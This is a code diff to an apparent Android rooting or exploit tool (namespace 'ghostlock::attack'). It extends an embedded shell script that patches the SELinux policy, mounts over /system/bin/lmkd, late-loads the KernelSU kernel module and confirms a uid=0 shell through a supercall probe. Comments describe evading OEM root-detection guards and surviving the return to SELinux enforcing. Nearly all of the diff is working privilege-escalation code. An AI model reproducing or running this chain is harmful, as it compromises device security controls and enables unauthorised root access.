@@ -364,12 +364,33 @@ namespace ghostlock::attack {
             /* /proc/modules lists a module as soon as init_module() inserts it,
              * with state "Loading" (MODULE_STATE_COMING). A name-only grep
              * therefore reports success while kernelsu_init() is still running.
-             * Read the state field (field 5) instead. */
+             * Read the state field (field 5) instead. Once enforcing is back,
+             * reading /proc/modules itself is denied on several ROMs (measured
+             * 2026-11-25 on beryl toolbox): report "unreadable" rather than
+             * folding that into "absent", which made every post-flip sample a
+             * false negative. */
             "ksu_state() {\n"
             "  ksu_line=$(grep '^kernelsu[[:space:]]' /proc/modules 2>/dev/null | head -1 | tr -s ' ' | cut -d' ' -f5)\n"
-            "  echo \"${ksu_line:-absent}\"\n"
+            "  if [ -n \"$ksu_line\" ]; then echo \"$ksu_line\"; return 0; fi\n"
+            "  if cat /proc/modules >/dev/null 2>&1; then echo absent; else echo unreadable; fi\n"
             "}\n"
             "ksu_live() { [ \"$(ksu_state)\" = Live ]; }\n"
+            /* The one readiness channel that survives the enforcing flip:
+             * `ksud debug su` runs a pure-userspace supercall and execs a shell,
+             * so it needs no kernel log, no /proc read and no $LOG write. The
+             * staged /data/local/tmp copy is exec-able by the shell domain under
+             * enforcing (measured 2026-11-26 on beryl cold, KSU absent: exec
+             * succeeds and the CLI banner prints), and uid=0 output is a positive
+             * signal that cannot be forged by a failed run. Before the module is
+             * inserted the supercall fails, so polling it early is safe. */
+            "KSU_STAGE=/data/local/tmp/ksud\n"
+            "KSU_SU_OK=0\n"
+            "ksu_su_probe() {\n"
+            "  [ -x \"$KSU_STAGE\" ] || return 1\n"
+            "  su_out=$(echo id | timeout 5 \"$KSU_STAGE\" debug su 2>&1); su_rc=$?\n"
+            "  case \"$su_out\" in *uid=0*) return 0 ;; esac\n"
+            "  return 1\n"
+            "}\n"
             /* OPlus/Realme ROOTCHECK (oplus_security_guard / secure_harden)
              * kills a root execve of an app-owned file under /data:
              * "execve_block", exit 137, "exited with preempt_count 1". The
@@ -409,12 +430,82 @@ namespace ghostlock::attack {
             "  return 0\n"
             "}\n"
             /* kernelsu_init ends with setenforce(true), and from that moment this
-             * shell cannot read /proc/modules. Measured 2026-11-15: the module
-             * is visible for ~0.2 s before the flip, which a grep pipeline
-             * cannot reliably sample. The drained kernel log in
-             * /data/local/tmp survives the flip, so readiness is "module seen"
-             * OR "KernelSU printed its banner" OR "ksud installed". */
-            "ksu_booted() { grep -q 'KernelSU: welcome' \"$KMSG_MIRROR\" 2>/dev/null; }\n"
+             * shell cannot read /proc/modules or dmesg. Measured 2026-11-15: the
+             * module is visible for ~0.2 s before the flip, which a grep
+             * pipeline cannot reliably sample. Keep a blocking /dev/kmsg watch
+             * open from before late-load so `KernelSU: welcome` (logged at the
+             * top of kernelsu_init, before setenforce) is caught in-flight and
+             * survives the flip even if the mirror write is denied. */
+            "KSU_WELCOME=0\n"
+            "KMSG_WATCH_PID=\"\"\n"
+            "ksu_watch_start() {\n"
+            "  [ -n \"$KMSG_WATCH_PID\" ] && return 0\n"
+            /* A silently skipped watch killed the verdict on beryl: the kmsg
+             * fd never opened and nothing in the log said why. Announce the
+             * skip reason (unredirected, so it survives the flip). */
+            "  if [ ! -r /dev/kmsg ]; then\n"
+            "    echo 'KSU-WATCH state=skipped reason=kmsg-unreadable'\n"
+            "    return 0\n"
+            "  fi\n"
+            "  (\n"
+            "    gp=\"\"\n"
+            "    grc=1\n"
+            "    trap '[ -n \"$gp\" ] && kill \"$gp\" 2>/dev/null; [ \"${grc:-1}\" -eq 0 ] && exit 0; exit 143' TERM INT\n"
+            "    while :; do\n"
+            "      grep -q 'KernelSU: welcome' /dev/kmsg 2>/dev/null &\n"
+            "      gp=$!\n"
+            "      wait \"$gp\" 2>/dev/null\n"
+            "      grc=$?\n"
+            "      gp=\"\"\n"
+            "      [ \"$grc\" -eq 0 ] && exit 0\n"
+            "      [ \"$(cat /sys/fs/selinux/enforce 2>/dev/null)\" = 0 ] || exit 1\n"
+            "      sleep 0.05\n"
+            "    done\n"
+            "  ) &\n"
+            "  KMSG_WATCH_PID=$!\n"
+            "  echo \"KSU-WATCH state=started pid=$KMSG_WATCH_PID\"\n"
+            "}\n"
+            "ksu_watch_reap() {\n"
+            "  [ \"$KSU_WELCOME\" -eq 1 ] && return 0\n"
+            "  [ -z \"$KMSG_WATCH_PID\" ] && return 1\n"
+            "  if grep -q '^State:[[:space:]]*Z' \"/proc/$KMSG_WATCH_PID/status\" 2>/dev/null || ! kill -0 \"$KMSG_WATCH_PID\" 2>/dev/null; then\n"
+            "    wait \"$KMSG_WATCH_PID\" 2>/dev/null\n"
+            "    w_rc=$?\n"
+            "    KMSG_WATCH_PID=\"\"\n"
+            "    if [ \"$w_rc\" -eq 0 ]; then\n"
+            "      KSU_WELCOME=1\n"
+            "      echo 'KSU-WATCH welcome=1'\n"
+            "      return 0\n"
+            "    fi\n"
+            "  fi\n"
+            "  return 1\n"
+            "}\n"
+            "ksu_watch_finish() {\n"
+            "  ksu_watch_reap && return 0\n"
+            "  [ -z \"$KMSG_WATCH_PID\" ] && return 0\n"
+            "  kill \"$KMSG_WATCH_PID\" 2>/dev/null\n"
+            "  wait \"$KMSG_WATCH_PID\" 2>/dev/null\n"
+            "  w_rc=$?\n"
+            "  KMSG_WATCH_PID=\"\"\n"
+            "  if [ \"$w_rc\" -eq 0 ]; then\n"
+            "    KSU_WELCOME=1\n"
+            "    echo 'KSU-WATCH welcome=1'\n"
+            "  fi\n"
+            "}\n"
+            "ksu_booted() {\n"
+            "  ksu_watch_reap && return 0\n"
+            "  [ \"$KSU_WELCOME\" -eq 1 ] && return 0\n"
+            /* Latch: the background drain rewrites the mirror every ~2 s, so a
+             * flood snapshot (2026-11-25: 1200 tp_marker lines) can overwrite a
+             * snapshot that carried the banner between two calls -- one probe
+             * said ready, the next said absent, and the wait loop ran exactly
+             * one round. Once the banner is seen anywhere, it stays seen. */
+            "  if grep -q 'KernelSU: welcome' \"$KMSG_MIRROR\" 2>/dev/null; then\n"
+            "    KSU_WELCOME=1\n"
+            "    return 0\n"
+            "  fi\n"
+            "  return 1\n"
+            "}\n"
             "ksu_crown() {\n"
             "  crown=$(grep -E 'Crowning manager: uid=|manager uid unchanged|Found manager base.apk|Search manager finished' \"$KMSG_MIRROR\" 2>/dev/null | tail -n 3)\n"
             "  case \"$crown\" in\n"
@@ -429,18 +520,32 @@ namespace ghostlock::attack {
             "  [ \"$KSU_SEEN\" = Loading ] && return 0\n"
             "  [ \"$KSU_SEEN\" = Live ] && return 0\n"
             "  [ -e /data/adb/ksud ] && return 0\n"
+            "  ksu_su_probe && return 0\n"
             "  return 1\n"
             "}\n"
             "wait_ksu_ready() {\n"
             "  KSU_INSTALL=0\n"
-            "  for i in $(seq 1 60); do\n"
+            /* Once SELinux flips back to enforcing, command substitution like
+             * $(seq ...) from this shell fails/returns empty and skips the loop
+             * altogether; use pure POSIX arithmetic instead. */
+            "  i=0\n"
+            "  while [ \"$i\" -lt 60 ]; do\n"
+            "    i=$((i + 1))\n"
             "    ks_s=$(ksu_state)\n"
             "    [ \"$ks_s\" = Live ] && KSU_SEEN=Live\n"
             "    [ \"$ks_s\" = Loading ] && [ \"$KSU_SEEN\" = absent ] && KSU_SEEN=Loading\n"
             "    [ -e /data/adb/ksud ] && KSU_INSTALL=1\n"
+            /* Positive, flip-proof signal: poll the staged ksud's supercall
+             * every round and latch the first uid=0. A latched probe is what
+             * makes the verdict survive a later unreadable /proc/modules. */
+            "    if [ \"$KSU_SU_OK\" -eq 0 ] && ksu_su_probe; then\n"
+            "      KSU_SU_OK=1\n"
+            "      echo 'KSU-DIRECT-SU ok=1 (supercall uid=0)'\n"
+            "    fi\n"
             "    if ksu_ready_now; then break; fi\n"
             "    sleep 0.1\n"
             "  done\n"
+            "  echo \"KSU-PROBE-DIAG last_state=$ks_s su_ok=$KSU_SU_OK\"\n"
             "  KSU_BOOT=0\n"
             "  ksu_booted && KSU_BOOT=1\n"
             "  KSU_SU_PRESENT=absent\n"
@@ -456,9 +561,10 @@ namespace ghostlock::attack {
              * crown lines. */
             "ksu_capture() {\n"
             "  n=0; miss=0\n"
+            "  echo \"KSU-CAPTURE-START enforce=$(cat /sys/fs/selinux/enforce 2>/dev/null || echo unreadable)\"\n"
             "  while [ \"$n\" -lt 12 ]; do\n"
             "    n=$((n + 1))\n"
-            "    if timeout 1 dmesg 2>/dev/null | tail -n 1200 >\"$KMSG_MIRROR.new\" 2>/dev/null && [ -s \"$KMSG_MIRROR.new\" ]; then\n"
+            "    if ( timeout 1 dmesg | tail -n 1200 >\"$KMSG_MIRROR.new\" ) 2>/dev/null && [ -s \"$KMSG_MIRROR.new\" ]; then\n"
             "      mv \"$KMSG_MIRROR.new\" \"$KMSG_MIRROR\" 2>/dev/null\n"
             "      if [ \"$KMSG_LOG\" != \"$KMSG_MIRROR\" ]; then cp \"$KMSG_MIRROR\" \"$KMSG_LOG\" 2>/dev/null; fi\n"
             "      miss=0\n"
@@ -469,7 +575,7 @@ namespace ghostlock::attack {
             "    sleep 0.1\n"
             "  done\n"
             "  KSU_BOOT=0; ksu_booted && KSU_BOOT=1\n"
-            "  echo \"KSU-CAPTURE samples=$n miss=$miss boot=$KSU_BOOT\"\n"
+            "  echo \"KSU-CAPTURE samples=$n miss=$miss boot=$KSU_BOOT welcome=$(grep -c 'KernelSU: welcome' \"$KMSG_MIRROR\" 2>/dev/null || echo unreadable)\"\n"
             "}\n"
             /* The crown compares the manager APK's signing certificate against a
              * hash compiled into the module. `ksud debug get-sign` is pure
@@ -679,7 +785,7 @@ namespace ghostlock::attack {
              * is load-bearing: once enforcing, dmesg fails but the pipeline
              * still exits 0 through tail, and an empty file would clobber the
              * last good snapshot (measured 2026-11-15). */
-            "      if timeout 2 dmesg 2>/dev/null | tail -n 1200 >\"$KMSG_MIRROR.new\" 2>/dev/null && [ -s \"$KMSG_MIRROR.new\" ]; then\n"
+            "      if ( timeout 2 dmesg | tail -n 1200 >\"$KMSG_MIRROR.new\" ) 2>/dev/null && [ -s \"$KMSG_MIRROR.new\" ]; then\n"
             "        mv \"$KMSG_MIRROR.new\" \"$KMSG_MIRROR\" 2>/dev/null\n"
             "        if [ \"$KMSG_LOG\" != \"$KMSG_MIRROR\" ]; then cp \"$KMSG_MIRROR\" \"$KMSG_LOG\" 2>/dev/null; fi\n"
             "      fi\n"
@@ -795,7 +901,7 @@ namespace ghostlock::attack {
             "  restore_enforce policy-dump\n"
             "  exit 1\n"
             "}\n"
-            "trap '[ -n \"$KMSG_DRAIN_PID\" ] && kill $KMSG_DRAIN_PID 2>/dev/null; [ -n \"$KMSG_LOG\" ] && rm -f \"$KMSG_LOG.new\" 2>/dev/null; umount -l /system/bin/lmkd 2>/dev/null; rm -f \"$POLICY\"; [ \"${DUMP_DONE:-0}\" = 1 ] || dump_debug' EXIT\n"
+            "trap '[ -n \"$KMSG_DRAIN_PID\" ] && kill $KMSG_DRAIN_PID 2>/dev/null; [ -n \"$KMSG_WATCH_PID\" ] && kill $KMSG_WATCH_PID 2>/dev/null; [ -n \"$KMSG_LOG\" ] && rm -f \"$KMSG_LOG.new\" 2>/dev/null; umount -l /system/bin/lmkd 2>/dev/null; rm -f \"$POLICY\"; [ \"${DUMP_DONE:-0}\" = 1 ] || dump_debug' EXIT\n"
             "prepare_policy() {\n"
             "  cat /sys/fs/selinux/policy >\"$POLICY\" || return 1\n"
             "  HEADER=$(od -An -tx1 -N24 \"$POLICY\" | tr -d ' \\n')\n"
@@ -811,7 +917,9 @@ namespace ghostlock::attack {
             "  printf '%%b' \"$CONFIG\" | dd of=\"$POLICY\" bs=1 seek=23 count=1 conv=notrunc\n"
             "}\n"
             "FIXUP_RC=1\n"
-            "for i in $(seq 1 10); do\n"
+            "i=0\n"
+            "while [ \"$i\" -lt 10 ]; do\n"
+            "  i=$((i + 1))\n"
             "  echo \"[*] fixup: attempt $i\" >>\"$LOG\"\n"
             "  if ! prepare_policy >>\"$LOG\" 2>&1; then\n"
             "    sleep 2\n"
@@ -907,6 +1015,7 @@ namespace ghostlock::attack {
              * 0.4 s and its daemonized ksud died before init_module, leaving
              * /proc/modules empty for the whole wait. Settle first, then retry
              * while the module stays absent. */
+            "  ksu_watch_start\n"
             "  LATE_LOAD_SETTLE=4\n"
             "  echo \"[*] post-fixup settle ${LATE_LOAD_SETTLE}s; mode=$LATE_LOAD_MODE gate=$OEM_GATE\" >>\"$LOG\"\n"
             "  sleep \"$LATE_LOAD_SETTLE\"\n"
@@ -918,19 +1027,35 @@ namespace ghostlock::attack {
             "  while [ \"$KSU_ATTEMPT\" -lt 3 ]; do\n"
             "    KSU_ATTEMPT=$((KSU_ATTEMPT + 1))\n"
             "    run_late_load \"$LATE_LOAD_MODE\"\n"
-            "    ksu_capture\n"
-            "    for i in $(seq 1 40); do\n"
+            /* Probe BEFORE capturing: measured 2026-11-25 on beryl, kernelsu_init
+             * completes in ~150 ms and its setenforce closes /proc/modules and
+             * dmesg while ksu_capture is still polling -- the capture burned the
+             * whole window and every later sample read as a false "absent". The
+             * state poll and the su supercall probe are the two signals that
+             * work inside that window; the mirror snapshot is diagnostics only. */
+            "    i=0\n"
+            "    while [ \"$i\" -lt 40 ]; do\n"
+            "      i=$((i + 1))\n"
             "      ks_s=$(ksu_state)\n"
             "      [ \"$ks_s\" = Live ] && KSU_SEEN=Live\n"
             "      [ \"$ks_s\" = Loading ] && [ \"$KSU_SEEN\" = absent ] && KSU_SEEN=Loading\n"
+            "      if [ \"$KSU_SU_OK\" -eq 0 ] && ksu_su_probe; then\n"
+            "        KSU_SU_OK=1\n"
+            "        echo 'KSU-DIRECT-SU ok=1 (supercall uid=0)'\n"
+            "      fi\n"
             "      if ksu_ready_now; then break; fi\n"
             "      sleep 0.1\n"
             "    done\n"
+            "    ksu_capture\n"
             "    KSU_BOOT=0\n"
             "    ksu_booted && KSU_BOOT=1\n"
-            "    echo \"KSU-ATTEMPT n=$KSU_ATTEMPT mode=$LATE_LOAD_MODE seen=$KSU_SEEN boot=$KSU_BOOT\"\n"
-            "    echo \"[*] attempt $KSU_ATTEMPT mode=$LATE_LOAD_MODE seen=$KSU_SEEN boot=$KSU_BOOT\" >>\"$LOG\"\n"
+            "    echo \"KSU-ATTEMPT n=$KSU_ATTEMPT mode=$LATE_LOAD_MODE seen=$KSU_SEEN boot=$KSU_BOOT su_ok=$KSU_SU_OK\"\n"
+            "    echo \"[*] attempt $KSU_ATTEMPT mode=$LATE_LOAD_MODE seen=$KSU_SEEN boot=$KSU_BOOT su_ok=$KSU_SU_OK\" >>\"$LOG\"\n"
             "    ksu_ready_now && break\n"
+            "    if [ \"$(cat /sys/fs/selinux/enforce 2>/dev/null)\" != 0 ]; then\n"
+            "      ksu_watch_finish\n"
+            "      ksu_ready_now && break\n"
+            "    fi\n"
             /* A gated device keeps the mount path: the direct exec is the one
              * the vendor kills. Elsewhere alternate to cover both carriers. */
             "    if [ \"$OEM_GATE\" -eq 0 ]; then\n"
@@ -941,6 +1066,8 @@ namespace ghostlock::attack {
             "fi\n"
             "if [ \"$KSU_ALREADY\" -eq 0 ]; then\n"
             "  wait_ksu_ready\n"
+            "  ksu_watch_finish\n"
+            "  ksu_booted && KSU_BOOT=1\n"
             "else\n"
             "  KSU_SEEN=Live\n"
             "  KSU_BOOT=1\n"
@@ -949,8 +1076,10 @@ namespace ghostlock::attack {
             "echo \"[*] temp su uid=$(id -u); watching kernelsu.ko\" >>\"$LOG\"\n"
             "KSU_READY=0\n"
             /* "Loading" only proves insertion; the banner and the installed
-             * daemon also prove kernelsu_init() ran. Prefer the stronger two. */
-            "if [ \"$KSU_SEEN\" = Live ] || [ \"$KSU_BOOT\" = 1 ] || [ \"$KSU_INSTALL\" -eq 1 ]; then KSU_READY=1; fi\n"
+             * daemon also prove kernelsu_init() ran. The latched supercall
+             * probe (uid=0 through the staged ksud) is the strongest of the
+             * four: it survives the enforcing flip that blinds the others. */
+            "if [ \"$KSU_SEEN\" = Live ] || [ \"$KSU_BOOT\" = 1 ] || [ \"$KSU_INSTALL\" -eq 1 ] || [ \"$KSU_SU_OK\" -eq 1 ]; then KSU_READY=1; fi\n"
             "if [ \"$KSU_READY\" -eq 1 ]; then\n"
             "  echo '[+] KernelSU module loaded' >>\"$LOG\"\n"
             /* ksud's userspace half (stage scripts, sepolicy rules and the
@@ -1011,7 +1140,7 @@ namespace ghostlock::attack {
              * the enforcing restore, and every dmesg read is bounded, so a
              * stuck dmesg can never hold the cleanup. */
             "if [ \"$NO_INSTR\" -eq 0 ]; then\n"
-            "  echo \"KSU-SUMMARY seen=$KSU_SEEN boot=$KSU_BOOT install=$KSU_INSTALL manager=$KSU_MANAGER attempts=$KSU_ATTEMPT enforce=$(cat /sys/fs/selinux/enforce 2>/dev/null) lmkd_mount=$(grep -c ' /system/bin/lmkd ' /proc/self/mountinfo 2>/dev/null) mirror=$KMSG_MIRROR log=$LOG\"\n"
+            "  echo \"KSU-SUMMARY seen=$KSU_SEEN boot=$KSU_BOOT install=$KSU_INSTALL su_ok=$KSU_SU_OK manager=$KSU_MANAGER attempts=$KSU_ATTEMPT enforce=$(cat /sys/fs/selinux/enforce 2>/dev/null) lmkd_mount=$(grep -c ' /system/bin/lmkd ' /proc/self/mountinfo 2>/dev/null) mirror=$KMSG_MIRROR log=$LOG\"\n"
             /* The drained kernel log is the only KSU evidence that survives the
              * enforcing flip; print it so the run log alone tells the story. */
             "  echo 'KSU-DMESG-BEGIN'\n"
@@ -1019,8 +1148,30 @@ namespace ghostlock::attack {
             "  echo 'KSU-DMESG-END'\n"
             "fi\n"
             "if [ \"$KSU_READY\" -ne 1 ]; then\n"
-            "  restore_enforce ksu-not-ready\n"
-            "  exit 1\n"
+            /* Last chance before declaring failure: the su supercall probe.
+             * Measured on-device: ksud's userspace half can land ~1.2 s AFTER
+             * late-load exit=0, and the manager crowning even later; a probe
+             * that ran once too early reads as empty. Poll the staged copy for
+             * 20 s. This cannot over-report: uid=0 output is a positive root
+             * grant, never a false positive. */
+            "  i=0\n"
+            "  while [ \"$i\" -lt 40 ]; do\n"
+            "    i=$((i + 1))\n"
+            "    if [ \"$KSU_SU_OK\" -eq 0 ] && ksu_su_probe; then\n"
+            "      KSU_SU_OK=1\n"
+            "      echo 'KSU-DIRECT-SU ok=1 (last-chance poll)'\n"
+            "      KSU_READY=1\n"
+            "      break\n"
+            "    fi\n"
+            "    sleep 0.5\n"
+            "  done\n"
+            "  echo \"KSU-FAIL-POLL rounds=$i su_ok=$KSU_SU_OK\"\n"
+            "  if [ \"$KSU_READY\" -eq 1 ]; then\n"
+            "    echo '[+] KernelSU module loaded (confirmed via supercall probe)' >>\"$LOG\"\n"
+            "  else\n"
+            "    restore_enforce ksu-not-ready\n"
+            "    exit 1\n"
+            "  fi\n"
             "fi\n"
             "else\n"
             "  echo '[!] fixup failed; restoring enforcing' >>\"$LOG\"\n"
